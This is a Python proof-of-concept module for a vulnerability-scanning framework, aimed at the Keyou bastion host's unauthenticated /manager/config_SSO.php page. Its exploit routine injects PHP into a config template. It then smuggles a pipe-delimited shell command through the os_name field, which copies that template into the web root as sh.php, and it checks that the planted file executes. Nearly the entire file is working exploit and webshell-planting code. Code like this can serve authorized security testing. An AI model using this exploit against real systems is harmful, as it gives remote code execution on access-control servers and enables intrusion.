# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import time


class Vuln(ABVuln):
    vuln_id = 'Keyou_0001'  # 平台漏洞编号，留空
    name = '江南科友堡垒机 未授权访问可getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-09-23'  # 漏洞公布时间
    desc = '''  
        江南科友堡垒机该漏洞在 /manager/config_SSO.php 当中
        此页面未做任何权限判断，导致任意用户可访问，进而getshell.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '江南科友堡垒机'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '62d1a924-b50b-441d-96e9-76ca18b5ea0a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # wooyun-2014-077033
            hh = hackhttp.hackhttp()
            arg = self.target
            path = '/manager/config_SSO.php'
            target = arg + path
            code, head, res, errcode, _ = hh.http(target)
            if code == 200 and ('os_name' in res) and ('telnet_os_login_mes' in res):
                #security_warning("Unauthorized access"+target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # wooyun-2014-077033
            hh = hackhttp.hackhttp()
            arg = self.target
            path = '/manager/config_SSO.php'
            target = arg + path
            code, head, res, errcode, _ = hh.http(target)
            if code == 200 and ('os_name' in res) and ('telnet_os_login_mes' in res):
                #security_warning("Unauthorized access"+target)
                shell_data = "type_mode=5201314<?php echo md5(3.14);?>&os_name=HP_11&config_flag=1"
                code, head, res, errcode, _ = hh.http(target, shell_data)
                exec_data = "os_name=a%20|cp%20/usr/local/keyou/Config/sso/HP_11/Template.cnf%20/usr/local/apache2/htdocs/project/www/sh.php%20|&config_flag=1"
                code, head, res, errcode, _ = hh.http(target, exec_data)
                target = arg + '/sh.php'
                code, head, res, errcode, _ = hh.http(target)
                if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
                    # security_hole("getshell:"+target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取shell为：{shell}'.format(
                        target=self.target, name=self.vuln.name, shell=target))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
